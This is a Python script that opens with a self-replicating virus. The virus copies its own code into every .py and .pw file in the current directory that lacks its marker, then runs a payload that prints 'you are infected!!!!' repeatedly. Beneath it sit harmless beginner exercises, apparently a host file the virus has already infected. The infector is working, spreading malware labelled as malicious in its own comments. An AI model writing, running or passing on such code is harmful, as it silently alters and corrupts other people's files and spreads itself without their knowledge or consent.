## start replicate ##

import sys
import glob

code = []

with open(sys.argv[0], 'r') as f:
    ln = f.readlines()

v = False
for l in ln:
    if l == '## start replicate ##\n':
        v = True
    if v:
        code.append(l)
        if l == '## end the script\n':
            break

python_file = glob.glob('*.py') + glob.glob('*.pw')
#print(python_file)

for scrpt in python_file:
    with open(scrpt, 'r') as f:
        scrpt_code = f.readlines()
    
    infect = False
    for l in scrpt_code:
        if l == '## start replicate ##\n':
            infect = True
            break
    if not infect:
        malicious = []
        malicious.extend(code)
        malicious.extend('\n')
        malicious.extend(scrpt_code)

        with open(scrpt, 'w') as f:
            f.writelines(malicious)

# the malicious code
a = 100
for i in range(1, 99):
    print("you are infected!!!!")
## end the script ##

#a basic program.
"""
def fib():
    a = 0
    b = 1
    while a < 100:
        print(a, end=',\n')
        a, b = b, a + b

fib()
"""

"""
n = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]

def numbers():
    #i = 0
    for i in n:
        #print(i % 2 == 0)
        if i % 2 == 0: #this a boolean operator
            print(i)
        else:
            print(0)

numbers()
"""

g = ['gold', 'bronze', 'silver', 'wood', 'earth']

def rangeme():
    #g = ['gold', 'bronze', 'silver', 'wood', 'earth']
    for i in range(len(g)):
        if g:
            print(i, g[i])
        else:
            print("it's not working")

rangeme()
